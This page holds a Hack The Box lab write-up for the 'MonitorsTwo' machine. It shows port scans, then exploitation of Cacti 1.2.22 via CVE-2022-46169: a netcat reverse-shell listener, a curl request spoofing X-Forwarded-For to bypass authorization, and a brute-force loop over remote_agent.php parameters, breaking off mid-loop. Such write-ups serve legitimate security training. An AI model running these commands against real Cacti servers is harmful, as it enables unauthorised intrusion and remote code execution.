<!DOCTYPE html>
<html lang="en">
    <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
        <meta name="author" content="Matthieu Mezirard">
    
    <meta name="author" content="Matthieu Mezirard" />
    
        <meta name="description" content="This is an easy Linux box.">
    
    <title>
        
            
        
        root@mmezirard:~&#x2F;htb-write-ups&#x2F;boxes&#x2F;monitorstwo#
    </title>
    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="stylesheet" type="text/css" href="/main.css" />
    <link
        id="theme-light-style"
        rel="stylesheet"
        type="text/css"
        href="/theme/light.css"
    />
    <link
        id="theme-dark-style"
        rel="stylesheet"
        type="text/css"
        href="/theme/dark.css"
    />
    <script
        async
        src="https://eu.umami.is/script.js"
        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
    ></script>
    <script src="/js/theme-toggle.js"></script>
    <script src="/js/code-wrapper.js"></script>
    <script src="/js/code-indicator.js"></script>
</head>


    <body>
        <header>
    <div class="left">
        <a href="/">
    mmezirard
</a>

        <div class="socials">
    
        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
            <img src="/icons/github.svg" alt="github" />
        </a>
    
        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
        </a>
    
        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
            <img src="/icons/hackerone.svg" alt="hackerone" />
        </a>
    
</div>

    </div>
    <div class="right">
        <nav>
    <ul>
        
            <li>
                <a href="&#x2F;htb-write-ups">
                    &#x2F;htb-write-ups
                </a>
            </li>
        
    </ul>
</nav>

        <button onclick="toggleTheme()">
    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
</button>
<script src="/js/theme-toggle.js"></script>

    </div>
</header>

        
    <main>
        
<article>
    <div>
        
    
        <div class="page-h1">
            MonitorsTwo<span>.</span>
        </div>
    


        <div class="page-metadata">
            
                Posted on <time>2023-05-04</time>
            
        </div>

        
            <img
                class="page-cover"
                alt="cover.png"
                src="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/cover.png"
            />
        
    </div>

    
        <h1>Table of Contents</h1>
        <ul>
            
                <li>
                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#information">Information</a>
                    
                </li>
            
                <li>
                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#setup">Setup</a>
                    
                </li>
            
                <li>
                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#host-10-10-11-211">Host 10.10.11.211</a>
                    
                        <ul>
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#scanning">Scanning</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#ports">Ports</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#fingerprinting">Fingerprinting</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#scripts">Scripts</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                        </ul>
                    
                </li>
            
                <li>
                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#host-172-19-0-3">Host 172.19.0.3</a>
                    
                        <ul>
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#services-enumeration">Services enumeration</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#nginx">Nginx</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#foothold-os-command-injection">Foothold (OS command injection)</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#preparation">Preparation</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#exploitation">Exploitation</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#spawning-a-pty">Spawning a pty</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#system-enumeration">System enumeration</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#suid">SUID</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#privilege-escalation-suid">Privilege escalation (SUID)</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#exploitation-1">Exploitation</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#system-enumeration-1">System enumeration</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#inspecting-entrypoint-sh">Inspecting &#x2F;entrypoint.sh</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                        </ul>
                    
                </li>
            
                <li>
                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#host-172-19-0-2">Host 172.19.0.2</a>
                    
                        <ul>
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#services-enumeration-1">Services enumeration</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#mysql">MySQL</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                        </ul>
                    
                </li>
            
                <li>
                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#host-10-10-11-211-1">Host 10.10.11.211</a>
                    
                        <ul>
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#foothold-ssh">Foothold (SSH)</a>
                                </li>

                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#getting-a-lay-of-the-land">Getting a lay of the land</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#architecture">Architecture</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#distribution">Distribution</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#kernel">Kernel</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#users">Users</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#groups">Groups</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#nics">NICs</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#hostname">Hostname</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#system-enumeration-2">System enumeration</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#flags">Flags</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#inspecting-var-spool-mail-marcus">Inspecting &#x2F;var&#x2F;spool&#x2F;mail&#x2F;marcus</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#privilege-escalation-cve-2021-41091">Privilege escalation (CVE-2021-41091)</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#checks">Checks</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#preparation-1">Preparation</a>
                                            </li>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#establishing-persistence">Establishing persistence</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                                <li>
                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#system-enumeration-3">System enumeration</a>
                                </li>

                                
                                    <ul>
                                        
                                            <li>
                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#flags-1">Flags</a>
                                            </li>
                                        
                                    </ul>
                                
                            
                        </ul>
                    
                </li>
            
                <li>
                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/#afterwords">Afterwords</a>
                    
                </li>
            
        </ul>
    

    <section><h1 id="information">Information</h1>
<p><strong>Difficulty</strong>: Easy</p>
<p><strong>OS</strong>: Linux</p>
<p><strong>Release date</strong>: 2023-04-29</p>
<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/114053">TheCyberGeek</a></p>
<h1 id="setup">Setup</h1>
<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great
practice security-wise, but it's a VM so it's alright. This way I won't have to
prefix some commands with <code>sudo</code>, which gets cumbersome in the long run.</p>
<p>I like to maintain consistency in my workflow for every box, so before starting
with the actual pentest, I'll prepare a few things:</p>
<ol>
<li>
<p>I'll create a directory that will contain every file related to this box.
I'll call it <code>workspace</code>, and it will be located at the root of my filesystem
<code>/</code>.</p>
</li>
<li>
<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll use
<code>httpsimpleserver</code> to create an HTTP server on port <code>80</code> and
<code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make
files in this folder available over the Internet, which will be especially
useful for transferring files to the target machine if need be!</p>
</li>
<li>
<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory.
This will come in handy once we get a foothold, for privilege escalation and
for pivoting inside the internal network.</p>
</li>
</ol>
<p>I'll also strive to minimize the use of Metasploit, because it hides the
complexity of some exploits, and prefer a more manual approach when it's not too
much hassle. This way, I'll have a better understanding of the exploits I'm
running, and I'll have more control over what's happening on the machine.</p>
<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.10</code>. The
commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever
need to transfer files or binaries to the target machine, I'll always place them
in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
<p>Now we should be ready to go!</p>
<h1 id="host-10-10-11-211">Host <code>10.10.11.211</code></h1>
<h2 id="scanning">Scanning</h2>
<h3 id="ports">Ports</h3>
<p>As usual, let's start by initiating a port scan on MonitorsTwo using a TCP SYN
<code>nmap</code> scan to assess its attack surface.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.211<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">PORT   STATE SERVICE
</span><span class="z-text z-plain">22/tcp open  ssh
</span><span class="z-text z-plain">80/tcp open  http
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<p>Let's also check the 500 most common UDP ports.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.211<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>top-ports</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>500<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">PORT   STATE         SERVICE
</span><span class="z-text z-plain">68/udp open|filtered dhcpc
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<h3 id="fingerprinting">Fingerprinting</h3>
<p>Following the ports scans, let's gather more data about the services associated
with the open TCP ports we found.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.211<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>22,80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">PORT   STATE SERVICE VERSION
</span><span class="z-text z-plain">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
</span><span class="z-text z-plain">80/tcp open  http    nginx 1.18.0 (Ubuntu)
</span><span class="z-text z-plain">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<p>Let's do the same for the UDP port.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.211<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>68<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">PORT   STATE         SERVICE VERSION
</span><span class="z-text z-plain">68/udp open|filtered dhcpc
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<p>Alright, so <code>nmap</code> managed to determine that MonitorsTwo is running Linux, and
the version of SSH suggests that it might be Ubuntu.</p>
<h3 id="scripts">Scripts</h3>
<p>Let's run <code>nmap</code>'s default scripts on the TCP services to see if they can find
additional information.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.211<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>22,80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">PORT   STATE SERVICE
</span><span class="z-text z-plain">22/tcp open  ssh
</span><span class="z-text z-plain">| ssh-hostkey: 
</span><span class="z-text z-plain">|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
</span><span class="z-text z-plain">|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
</span><span class="z-text z-plain">|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
</span><span class="z-text z-plain">80/tcp open  http
</span><span class="z-text z-plain">|_http-title: Login to Cacti
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<p>Let's also run them on the UDP service.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.211<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>68<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
</span><span class="z-text z-plain">PORT   STATE         SERVICE
</span><span class="z-text z-plain">68/udp open|filtered dhcpc
</span><span class="z-text z-plain">&lt;SNIP&gt;
</span></code></pre>
<h1 id="host-172-19-0-3">Host <code>172.19.0.3</code></h1>
<h2 id="services-enumeration">Services enumeration</h2>
<h3 id="nginx">Nginx</h3>
<h4 id="exploration">Exploration</h4>
<p>Let's browse to <code>http://10.10.11.211/</code>.</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/nginx-homepage.png" alt="Nginx homepage" /></p>
<p>We're presented a login page for Cacti.</p>
<blockquote>
<p>Cacti provides a robust and extensible operational monitoring and fault
management framework for users around the world. It's also a complete network
graphing solution designed to harness the power of RRDTool's data storage and
graphing functionality.</p>
<p>— <a href="https://www.cacti.net/">Cacti</a></p>
</blockquote>
<h4 id="fingerprinting-1">Fingerprinting</h4>
<p>Let's fingerprint the technologies used by this web page with the
<a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/monitorstwo/nginx-homepage-wappalyzer.png" alt="Nginx homepage Wappalyzer extension" /></p>
<p>This reveals that this web page is using PHP version <code>7.4.33</code>.</p>
<p>The login page also reveals that it's using Cacti version <code>1.2.22</code>.</p>
<h4 id="exploration-1">Exploration</h4>
<p>We need to authenticate to access functionalities.</p>
<p>If we search online for Cacti's default credentials, we find <code>admin</code>:<code>admin</code>,
but unfortunately they don't work.</p>
<p>What about common credentials then? I launched a Cluster bomb attack on Burp
Suite using
<a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt">this wordlist</a>
for the usernames and
<a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-passwords-shortlist.txt">this wordlist</a>
for the passwords. Unfortunately, they all failed.</p>
<h4 id="known-vulnerabilities">Known vulnerabilities</h4>
<p>If we search <a href="https://www.exploit-db.com/">ExploitDB</a> for <code>Cacti 1.2.22</code>, we
find
<a href="https://www.exploit-db.com/exploits/51166">Cacti v1.2.22 - Remote Command Execution (RCE)</a>
(<a href="https://nvd.nist.gov/vuln/detail/CVE-2022-46169">CVE-2022-46169</a>).</p>
<h2 id="foothold-os-command-injection">Foothold (OS command injection)</h2>
<p>Cacti versions up to <code>1.2.22</code> are vulnerable to an OS command injection after an
authentication bypass. This vulnerability stems from a lack of proper
authorization in the <code>/remote_agent.php</code> page, as an attacker can craft HTTP
headers and set them to the target IP to bypass the <code>remote_client_authorized</code>
validation. Then, the attacker can obtain RCE by specifying his own commands
with the <code>poller_id</code> parameter, which isn't sanitized at all, and bruteforce
valid <code>host_id</code> and <code>local_data_id</code> parameters since they're numbered in
ascending order.</p>
<p>You can read more about it on
<a href="https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/">SonarCloud</a>.</p>
<h3 id="preparation">Preparation</h3>
<p>The Metasploit module <code>exploit/linux/http/cacti_unauthenticated_cmd_injection</code>
can be used to exploit this vulnerability, but it's not too hard to do manually.</p>
<p>The goal is to obtain a reverse shell.</p>
<p>First, I'll setup a listener to receive the shell.</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>9001<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<p>Then, I'll choose the 'Bash -i' payload from
<a href="https://www.revshells.com/">RevShells</a> configured to obtain a <code>/bin/bash</code>
shell.</p>
<p>I'll save it as the <code>REVSHELL_PAYLOAD</code> shell variable.</p>
<h3 id="exploitation">Exploitation</h3>
<p>To exploit this vulnerability, we need to have access to <code>/remote_agent.php</code>.
Let's check if the <code>127.0.0.1</code> address passes the authorization check:</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>H</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>X-Forwarded-For: 127.0.0.1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://10.10.11.211/remote_agent.php<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
</span></code></pre>
<pre class="z-code"><code><span class="z-text z-plain">Unknown Agent Request
</span></code></pre>
<p>We don't get an authorization error message, so it's valid.</p>
<p>Now we have access to the <code>/remote_agent.php</code> functionalities. To exploit the OS
command injection vulnerability, we need valid <code>host_id</code> and <code>local_data_id</code>
values, so let's bruteforce them:</p>
<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> for i in <span class="z-meta z-group z-expansion z-brace z-shell"><span class="z-punctuation z-section z-expansion z-brace z-begin z-shell">{</span>1..10<span class="z-punctuation z-section z-expansion z-brace z-end z-shell">}</span></span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-keyword z-control z-loop z-do z-shell">do</span> <span class="z-punctuation z-separator z-continuation z-line z-shell">\
</span></span><span class="z-source z-shell z-bash">      <span class="z-keyword z-control z-loop z-for z-shell">for</span><span class="z-meta z-group z-for z-shell"> j <span class="z-keyword z-control z-in z-shell">in</span> <span class="z-meta z-group z-expansion z-brace z-shell"><span class="z-punctuation z-section z-expansion z-brace z-begin z-shell">{</span>1..10<span class="z-punctuation z-section z-expansion z-brace z-end z-shell">}</span></span></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-keyword z-control z-loop z-do z-shell">do</span> <span class="z-punctuation z-separator z-continuation z-line z-shell">\
</span></span><span class="z-source z-shell z-bash">          <span class="z-variable z-other z-readwrite z-assignment z-shell">RESPONSE</span><span class="z-keyword z-operator z-assignment z-shell">=</span><span class="z-string z-unquoted z-shell"><span class="z-meta z-group z-expansion z-command z-parens z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-punctuation z-section z-parens z-begin z-shell">(</span><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">curl</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>H</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>X-Forwarded-For: 127.0.0.1<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://10.10.11.211/remote_agent.php<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>G</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>action=polldata<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>host_id=<span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">i</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>local_data_ids[]=<span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">j</span></span><span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>data-urlencode</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>poller_id=<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span><span class="z-punctuation z-section z-parens z-end z-shell">)</span></span></span><span class="z-meta z-function-call z-shell"></span><span class="z-keyword z-operator z-logical z-continue z-shell">;</span> <span class="z-punctuation z-separator z-continuation z-line z-shell">\
